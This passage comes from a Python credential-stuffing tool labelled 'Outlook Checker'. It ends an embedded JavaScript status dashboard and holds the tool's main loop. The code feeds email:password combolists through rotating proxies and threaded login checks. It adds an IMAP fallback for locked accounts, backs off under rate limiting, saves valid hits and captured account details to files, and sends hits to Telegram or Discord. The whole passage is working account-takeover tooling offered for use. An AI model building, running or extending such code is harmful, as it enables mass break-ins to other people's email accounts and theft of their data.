  }
});

// ---------- Chart.js: Doughnut ----------
const doughnutCtx = document.getElementById('doughnutChart').getContext('2d');
const doughnutChart = new Chart(doughnutCtx, {
  type: 'doughnut',
  data: {
    labels: ['Valid','2FA','Consent','Pending','IMAP','Locked','Recovery','Wrong PW','Not Exist','Invalid','Failed','Rate Limited'],
    datasets: [{
      data: [0,0,0,0,0,0,0,0,0,0,0,0],
      backgroundColor: ['#22c55e','#06b6d4','#3b82f6','#f59e0b','#2dd4bf','#fb923c','#eab308','#ef4444','#6b7280','#dc2626','#374151','#a855f7'],
      borderWidth: 0,
      hoverOffset: 6
    }]
  },
  options: {
    responsive:true, maintainAspectRatio:false, cutout:'68%',
    plugins:{
      legend:{position:'right',labels:{color:'#94a3b8',font:{size:10},padding:8,usePointStyle:true,pointStyle:'circle'}},
      tooltip:{backgroundColor:'rgba(15,23,42,0.9)',titleColor:'#e2e8f0',bodyColor:'#94a3b8',borderColor:'rgba(255,255,255,0.1)',borderWidth:1,cornerRadius:8}
    }
  }
});

// ---------- State ----------
let sseConnected = false;
let lastActivityLen = 0;
const counterKeys = ['valid','2fa','consent','pending_security','imap_valid','locked','recovery','password','not_exist','invalid','failed','rate_limited'];
const prevValues = {};
counterKeys.forEach(k => prevValues[k] = 0);

// ---------- Number animation ----------
function animateValue(el, start, end, duration) {
  if (start === end) return;
  const range = end - start;
  const startTime = performance.now();
  function step(now) {
    const progress = Math.min((now - startTime) / duration, 1);
    const eased = 1 - Math.pow(1 - progress, 3);
    el.textContent = Math.round(start + range * eased).toLocaleString();
    if (progress < 1) requestAnimationFrame(step);
  }
  requestAnimationFrame(step);
}

// ---------- Status class for log entries ----------
function statusClass(s) {
  const u = s.toUpperCase();
  if (u.includes('VALID') || u.includes('2FA') || u.includes('CONSENT')) return 's-valid';
  if (u.includes('LOCKED') || u.includes('RECOVERY')) return 's-locked';
  if (u.includes('RATE')) return 's-rate';
  if (u.includes('IMAP')) return 's-imap';
  if (u.includes('FAILED')) return 's-failed';
  return 's-invalid';
}

// ---------- Update dashboard from data object ----------
function updateDashboard(d) {
  // Nav meta
  document.getElementById('runtime').textContent = d.runtime || '00:00:00';
  document.getElementById('speed').textContent = (d.speed || 0).toFixed(1);
  document.getElementById('cpm').textContent = Math.round(d.cpm || 0);
  document.getElementById('threads').textContent = (d.active_threads||0)+'/'+(d.target_threads||0);
  document.getElementById('eta').textContent = d.eta || '--';

  // Progress
  const pct = d.pct || 0;
  document.getElementById('progressBar').style.width = pct.toFixed(1)+'%';
  document.getElementById('progressPct').textContent = pct.toFixed(1)+'%';
  document.getElementById('checked').textContent = (d.total_checked||0).toLocaleString();
  document.getElementById('total').textContent = (d.total_combos||0).toLocaleString();
  document.getElementById('remaining').textContent = (d.remaining||0).toLocaleString();
  document.getElementById('hitRate').textContent = (d.hit_rate||0).toFixed(1);

  // Stat cards with animation
  const c = d.counters || {};
  counterKeys.forEach(k => {
    const el = document.getElementById('s-'+k);
    if (!el) return;
    const newVal = c[k] || 0;
    const oldVal = prevValues[k] || 0;
    if (newVal !== oldVal) {
      animateValue(el, oldVal, newVal, 400);
      prevValues[k] = newVal;
    }
  });

  // Doughnut chart
  doughnutChart.data.datasets[0].data = counterKeys.map(k => c[k]||0);
  doughnutChart.update('none');

  // Uptime
  document.getElementById('uptimeVal').textContent = d.runtime || '0s';

  // Thread slider sync (only on first load)
  if (!window._sliderInit && d.target_threads) {
    document.getElementById('threadSlider').value = d.target_threads;
    document.getElementById('threadSliderVal').textContent = d.target_threads;
    window._sliderInit = true;
  }

  // Activity from SSE
  if (d.recent_activity && d.recent_activity.length > 0) {
    updateActivityLog(d.recent_activity);
  }
}

// ---------- Activity log rendering ----------
let activityEntries = [];
function updateActivityLog(entries) {
  if (!entries || entries.length === 0) return;
  // Merge new entries
  entries.forEach(e => {
    const key = e.time + e.thread + e.status + e.account;
    if (!activityEntries.find(a => a._key === key)) {
      e._key = key;
      activityEntries.push(e);
    }
  });
  // Keep max 50
  if (activityEntries.length > 50) activityEntries = activityEntries.slice(-50);
  renderActivityLog();
}
function renderActivityLog() {
  const log = document.getElementById('activityLog');
  const recent = activityEntries.slice(-50).reverse();
  log.innerHTML = recent.map(e =>
    '<div class="log-entry">' +
      '<span class="log-time">'+ e.time +'</span>' +
      '<span class="log-thread">T-'+ String(e.thread).padStart(2,'0') +'</span>' +
      '<span class="log-status '+ statusClass(e.status) +'">'+ e.status +'</span>' +
      '<span class="log-account">'+ e.account +'</span>' +
    '</div>'
  ).join('');
}

// ---------- SSE Connection ----------
function connectSSE() {
  try {
    const es = new EventSource('/api/stream');
    es.onopen = () => {
      sseConnected = true;
      const cs = document.getElementById('connStatus');
      cs.className = 'conn-status connected';
      cs.textContent = '● SSE';
      document.getElementById('connDetail').textContent = 'SSE Connected';
    };
    es.onmessage = (evt) => {
      try {
        const data = JSON.parse(evt.data);
        updateDashboard(data);
      } catch(e){}
    };
    es.onerror = () => {
      sseConnected = false;
      es.close();
      const cs = document.getElementById('connStatus');
      cs.className = 'conn-status polling';
      cs.textContent = '● Poll';
      document.getElementById('connDetail').textContent = 'Polling (SSE failed)';
      // Fallback to polling
      startPolling();
    };
  } catch(e) {
    startPolling();
  }
}

// ---------- Polling fallback ----------
let pollInterval = null;
function startPolling() {
  if (pollInterval) return;
  pollInterval = setInterval(async () => {
    try {
      const res = await fetch('/api/stats');
      const d = await res.json();
      updateDashboard(d);
    } catch(e){}
    try {
      const res = await fetch('/api/activity?limit=50');
      const d = await res.json();
      if (d.entries) updateActivityLog(d.entries);
    } catch(e){}
  }, 2000);
}

// ---------- CPM History Chart ----------
async function fetchCPMHistory() {
  try {
    const res = await fetch('/api/history');
    const d = await res.json();
    const history = d.history || [];
    document.getElementById('historyPoints').textContent = history.length;
    if (history.length === 0) return;

    // Only show last 100 points on chart
    const slice = history.slice(-100);
    cpmChart.data.labels = slice.map(p => p.time_label);
    cpmChart.data.datasets[0].data = slice.map(p => p.cpm);
    cpmChart.data.datasets[1].data = slice.map(p => p.hit_rate);
    cpmChart.update('none');
  } catch(e){}
}
setInterval(fetchCPMHistory, 5000);
fetchCPMHistory();

// ---------- Proxy table ----------
let proxySortKey = 'address';
let proxySortAsc = true;
let proxyData = [];

async function fetchProxies() {
  try {
    const res = await fetch('/api/proxies');
    const d = await res.json();
    proxyData = d.proxies || [];
    const section = document.getElementById('proxySection');
    if (proxyData.length > 0) {
      section.style.display = 'block';
      const alive = proxyData.filter(p => p.alive).length;
      document.getElementById('proxyTotal').textContent = proxyData.length;
      document.getElementById('proxyAlive').textContent = alive;
      document.getElementById('proxyDead').textContent = proxyData.length - alive;
      renderProxyTable();
    }
  } catch(e){}
}
function renderProxyTable() {
  const sorted = [...proxyData].sort((a,b) => {
    let va = a[proxySortKey], vb = b[proxySortKey];
    if (typeof va === 'string') va = va.toLowerCase();
    if (typeof vb === 'string') vb = vb.toLowerCase();
    if (va < vb) return proxySortAsc ? -1 : 1;
    if (va > vb) return proxySortAsc ? 1 : -1;
    return 0;
  });
  const tbody = document.getElementById('proxyTableBody');
  tbody.innerHTML = sorted.map(p =>
    '<tr>' +
      '<td style="font-family:monospace;font-size:11px">'+ p.address +'</td>' +
      '<td><span class="badge '+(p.alive?'badge-alive':'badge-dead')+'">'+(p.alive?'ALIVE':'DEAD')+'</span></td>' +
      '<td>'+ p.latency +'</td>' +
      '<td>'+ p.country +'</td>' +
      '<td style="color:var(--green)">'+ p.success_count +'</td>' +
      '<td style="color:var(--red)">'+ p.fail_count +'</td>' +
    '</tr>'
  ).join('');
}
document.querySelectorAll('.proxy-table th[data-sort]').forEach(th => {
  th.addEventListener('click', () => {
    const key = th.dataset.sort;
    if (proxySortKey === key) proxySortAsc = !proxySortAsc;
    else { proxySortKey = key; proxySortAsc = true; }
    renderProxyTable();
  });
});
setInterval(fetchProxies, 10000);
fetchProxies();

// ---------- Geo distribution ----------
async function fetchGeo() {
  try {
    const res = await fetch('/api/geo');
    const d = await res.json();
    const dist = d.distribution || {};
    const entries = Object.entries(dist).sort((a,b) => b[1] - a[1]);
    if (entries.length === 0) return;
    const maxVal = entries[0][1];
    const container = document.getElementById('geoBars');
    container.innerHTML = entries.map(([country, count]) => {
      const pct = (count / maxVal * 100).toFixed(0);
      return '<div class="geo-bar-row">' +
        '<span class="geo-bar-label">'+ country +'</span>' +
        '<div class="geo-bar-track"><div class="geo-bar-fill" style="width:'+ pct +'%"></div></div>' +
        '<span class="geo-bar-count">'+ count +'</span>' +
      '</div>';
    }).join('');
  } catch(e){}
}
setInterval(fetchGeo, 15000);
fetchGeo();

// ---------- Export ----------
function doExport() {
  const fmt = document.getElementById('exportFormat').value;
  const filt = document.getElementById('exportFilter').value;
  const fields = [...document.querySelectorAll('.export-field:checked')].map(c => c.value).join(',');
  const url = '/api/export?format='+fmt+'&filter='+filt+'&fields='+encodeURIComponent(fields);
  // Trigger browser download
  const a = document.createElement('a');
  a.href = url;
  a.download = 'export.' + fmt;
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
}

// ---------- Controls ----------
async function controlPause() {
  try { await fetch('/api/control/pause', {method:'POST'}); } catch(e){}
  document.getElementById('btnPause').style.opacity = '0.5';
  document.getElementById('btnResume').style.opacity = '1';
}
async function controlResume() {
  try { await fetch('/api/control/resume', {method:'POST'}); } catch(e){}
  document.getElementById('btnResume').style.opacity = '0.5';
  document.getElementById('btnPause').style.opacity = '1';
}
async function setThreads() {
  const n = parseInt(document.getElementById('threadSlider').value);
  try {
    await fetch('/api/control/threads', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({threads: n})
    });
  } catch(e){}
}
document.getElementById('threadSlider').addEventListener('input', function() {
  document.getElementById('threadSliderVal').textContent = this.value;
});

// ---------- Init ----------
connectSSE();

// Also do an immediate stats fetch for fast first paint
(async () => {
  try {
    const res = await fetch('/api/stats');
    const d = await res.json();
    updateDashboard(d);
  } catch(e){}
  try {
    const res = await fetch('/api/activity?limit=50');
    const d = await res.json();
    if (d.entries) updateActivityLog(d.entries);
  } catch(e){}
})();
</script>
</body>
</html>'''

# ============================================================================
# MAIN ENTRY POINT
# ============================================================================


def main():
    global start_time, title_update_thread, should_update_title, target_thread_count
    global thread_restart_enabled, session_manager, combo_file_position
    global dashboard_instance, notifier

    check_windows_only()
    set_console_title("Outlook Checker By: t.me/occursive")

    ensure_output_folder()

    result = preprocess_combo_file(COMBOLIST_FILE)
    if len(result) == 5:
        success, unique_combos, duplicates, invalid_format_count, invalid_email_count = result
    else:
        success, unique_combos, duplicates, invalid_format_count = result
        invalid_email_count = 0

    if not success:
        eprint("Failed to preprocess combo file.")
        safe_exit()
        return

    if not load_combos_optimized(COMBOLIST_FILE):
        safe_exit()
        return

    summary_parts = [
        f"{Fore.LIGHTBLACK_EX}Loaded {Fore.LIGHTGREEN_EX}{unique_combos:,} {Fore.LIGHTBLACK_EX}unique combos.",
        f"Removed {Fore.LIGHTRED_EX}{duplicates:,} {Fore.LIGHTBLACK_EX}duplicates",
        f"and {Fore.LIGHTRED_EX}{invalid_format_count:,} {Fore.LIGHTBLACK_EX}invalid format"
    ]
    if invalid_email_count > 0:
        summary_parts.append(
            f"and {Fore.LIGHTYELLOW_EX}{invalid_email_count:,} {Fore.LIGHTBLACK_EX}invalid email")
    safe_print(" ".join(summary_parts) + f" entries.\n")

    setup_proxies()
    if not proxy_mode:
        safe_print(
            f"{Fore.LIGHTBLACK_EX}Running in proxyless mode (no proxies.txt found)\n")

    notifier = NotificationManager(CONFIG)
    if notifier.enabled:
        safe_print(
            f"{Fore.LIGHTGREEN_EX}🔔 Notifications enabled{Style.RESET_ALL}")
        if CONFIG.get('telegram_bot_token'):
            safe_print(f"   └─ Telegram: {Fore.CYAN}Active{Style.RESET_ALL}")
        if CONFIG.get('discord_webhook_url'):
            safe_print(f"   └─ Discord:  {Fore.CYAN}Active{Style.RESET_ALL}")
        print()

    features = []
    if CONFIG.get('capture_enabled'):
        features.append("Capture")
    if CONFIG.get('imap_check_enabled'):
        features.append("IMAP Check")
    if CONFIG.get('web_dashboard_enabled'):
        features.append("Web Dashboard")
    if features:
        safe_print(
            f"{Fore.LIGHTBLACK_EX}Active features: {Fore.CYAN}{', '.join(features)}{Style.RESET_ALL}\n")

    session_manager = SessionManager(CONFIG)
    should_resume, saved_position = session_manager.check_existing_session()
    if should_resume:
        restored = session_manager.get_restored_counters()
        restore_counters(restored)
        combo_file_position = saved_position
        with counters_lock:
            already_checked = sum(restored.values())
        safe_print(
            f"{Fore.LIGHTGREEN_EX}✓ Resumed: {already_checked:,} already checked, continuing from position {saved_position:,}\n")

    target_thread_count = input_thread_count()
    if target_thread_count is None:
        return

    os.system('clear' if os.name != 'nt' else 'cls')

    set_start_time()

    web_thread = None
    if CONFIG.get('web_dashboard_enabled', False):
        try:
            web_port = CONFIG.get('web_dashboard_port', 8080)
            init_web_dashboard(
                get_all_counters,
                get_active_worker_threads,
                target_thread_count,
                total_combos
            )
            web_thread = start_web_dashboard(port=web_port)
            safe_print(
                f"{Fore.LIGHTCYAN_EX}🌐 Web dashboard: {Fore.WHITE}http://localhost:{web_port}{Style.RESET_ALL}\n")
        except Exception as e:
            safe_print(
                f"{Fore.YELLOW}Web dashboard failed to start: {e}{Style.RESET_ALL}\n")

    dashboard = Dashboard(
        total_combos=total_combos,
        get_counters_func=get_all_counters,
        get_active_threads_func=get_active_worker_threads,
        target_threads=target_thread_count
    )
    dashboard_instance = dashboard
    dashboard.start()

    feeder_thread = threading.Thread(target=combo_feeder, daemon=True)
    feeder_thread.start()

    for i in range(target_thread_count):
        start_worker_thread(i + 1, thread_worker)

    monitor_thread = threading.Thread(
        target=thread_monitor, args=(thread_worker,), daemon=True)
    monitor_thread.start()

    try:
        monitor_thread.join()
    except KeyboardInterrupt:
        if session_manager:
            session_manager.force_save(
                get_all_counters, combo_file_position, total_combos)
        dashboard.stop()
        dashboard_instance = None
        safe_print(
            f"\n{Fore.RED}Program interrupted by user. Session saved! ✓{Style.RESET_ALL}")
        thread_restart_enabled = False
        should_update_title = False
        return

    time.sleep(1)

    thread_restart_enabled = False
    should_update_title = False

    dashboard.stop()
    dashboard_instance = None

    safe_print(
        f"{Fore.LIGHTGREEN_EX}All combos processed! Finalizing...{Style.RESET_ALL}")

    flush_all_buffers()

    with threads_lock:
        for thread in threads_list:
            if thread.is_alive():
                thread.join(timeout=10)

    time.sleep(0.5)

    should_update_title = False

    print_analysis_report()

    if notifier and notifier.enabled:
        counters = get_all_counters()
        total_checked = sum(counters.values())
        total_valid = counters.get('valid', 0) + counters.get('2fa', 0) + counters.get(
            'consent', 0) + counters.get('pending_security', 0) + counters.get('imap_valid', 0)
        total_invalid = counters.get('locked', 0) + counters.get('recovery', 0) + counters.get(
            'password', 0) + counters.get('not_exist', 0) + counters.get('invalid', 0)
        notifier.notify_summary({
            'total_checked': total_checked,
            'total_valid': total_valid,
            'total_invalid': total_invalid,
            'failed': counters.get('failed', 0),
            'runtime': get_runtime()
        })

    if session_manager:
        session_manager.delete_session()

    safe_exit()


def thread_worker(thread_id):
    global thread_restart_enabled, combo_queue, combo_file_position, combo_file_size
    global session_manager, notifier
    consecutive_failures = 0
    max_consecutive_failures = 15
    thread_name = f"Thread-{thread_id}"
    local_processed = 0
    backoff_delay = CONFIG.get('rate_limit_base_delay', 5)
    max_backoff = CONFIG.get('rate_limit_max_delay', 60)
    capture_enabled = CONFIG.get('capture_enabled', False)
    imap_enabled = CONFIG.get('imap_check_enabled', False)

    while thread_restart_enabled:
        if rate_limit_event.is_set():
            time.sleep(backoff_delay)

        try:
            combo = combo_queue.get(timeout=3)
        except queue.Empty:
            if combo_file_position < combo_file_size:
                time.sleep(0.1)
                continue
            else:
                break

        if ":" not in combo:
            combo_queue.task_done()
            update_counter("failed")
            continue

        email, password = combo.split(":", 1)
        current_proxy = get_next_proxy() if proxy_mode else None

        try:
            account, reason = check(email, password, proxy_url=current_proxy)
            consecutive_failures = 0
            local_processed += 1
        except Exception:
            consecutive_failures += 1
            combo_queue.task_done()
            update_counter("failed")
            if consecutive_failures >= max_consecutive_failures:
                eprint(
                    f"{thread_name} restarting due to {consecutive_failures} consecutive failures")
                break
            continue

        # ---- Rate limiting ----
        if reason == "rate_limited":
            update_counter("rate_limited")
            rate_limit_event.set()
            oprint(thread_id, "⚠ RATE LIMITED", f"Pausing {backoff_delay}s...")
            _log_web_activity(thread_id, "⚠ RATE LIMITED",
                              f"Pausing {backoff_delay}s...")
            time.sleep(backoff_delay)
            backoff_delay = min(backoff_delay * 2, max_backoff)
            try:
                combo_queue.put(combo, timeout=1)
            except queue.Full:
                write_to_file_buffered(
                    "output/others/rate_limited.txt", account)
            combo_queue.task_done()
            rate_limit_event.clear()
            continue
        else:
            backoff_delay = CONFIG.get('rate_limit_base_delay', 5)

        update_counter(reason)

        # ---- IMAP fallback ----
        if imap_enabled and reason in ("locked", "recovery", "pending_security"):
            try:
                _, imap_reason = imap_check(email, password)
                if imap_reason == "imap_valid":
                    update_counter("imap_valid")
                    vprint(thread_id, "IMAP VALID", account)
                    _log_web_activity(thread_id, "IMAP VALID", account)
                    if notifier:
                        notifier.notify_valid(account, "imap_valid")
            except Exception:
                pass

        # ---- Define valid types once ----
        valid_types = ("valid", "2fa", "consent",
                       "pending_security", "imap_valid")

        # ---- Write output files ----
        if reason in valid_types:
            # 1. All valid hits → output/valid.txt
            write_to_file_buffered("output/valid.txt", account)

            # 2. Capture (if enabled) → output/capture/captured.txt
            if capture_enabled:
                try:
                    details = capture_details(email, password)
                    if details:
                        captured_line = format_capture(account, details)
                        write_to_file_buffered(
                            "output/capture/captured.txt", captured_line)
                except Exception:
                    pass

            # 3. Send notification (for all valid types)
            if notifier:
                notifier.notify_valid(account, reason)

        else:
            # Non-valid → output/others/
            file_path_map = {
                "locked": "output/others/locked.txt",
                "recovery": "output/others/recovery.txt",
                "password": "output/others/wrong_password.txt",
                "not_exist": "output/others/not_exist.txt",
                "invalid": "output/others/invalid.txt",
                "failed": "output/others/failed.txt"
            }
            file_path = file_path_map.get(reason, "output/others/unknown.txt")
            write_to_file_buffered(file_path, account)

        # ---- Session manager ----
        if session_manager:
            session_manager.notify_processed(
                get_all_counters, combo_file_position, total_combos)

        # ---- GC ----
        if local_processed % 50 == 0:
            gc.collect()

        # ---- Print status ----
        status_label = None
        if reason == "failed":
            iprint(thread_id, "FAILED",
                   f"Maximum retry limit reached: {account}")
            status_label = "FAILED"
        elif reason == "valid":
            vprint(thread_id, "VALID", account)
            status_label = "VALID"
        elif reason == "2fa":
            vprint(thread_id, "VALID (2FA)", account)
            status_label = "VALID (2FA)"
        elif reason == "consent":
            vprint(thread_id, "VALID (consent)", account)
            status_label = "VALID (consent)"
        elif reason == "pending_security":
            vprint(thread_id, "VALID (pending security)", account)
            status_label = "VALID (pending security)"
        elif reason == "locked":
            oprint(thread_id, "LOCKED", account)
            status_label = "LOCKED"
        elif reason == "recovery":
            oprint(thread_id, "RECOVERY", account)
            status_label = "RECOVERY"
        elif reason == "password":
            iprint(thread_id, "INVALID (wrong pass)", account)
            status_label = "INVALID (wrong pass)"
        elif reason == "not_exist":
            iprint(thread_id, "INVALID (not exist)", account)
            status_label = "INVALID (not exist)"
        elif reason == "invalid":
            iprint(thread_id, "INVALID", account)
            status_label = "INVALID"

        if status_label:
            _log_web_activity(thread_id, status_label, account)

        combo_queue.task_done()


def _log_web_activity(thread_id, status, account):
    try:
        add_activity(thread_id, status, account)
    except Exception:
        pass


if __name__ == "__main__":
    main()
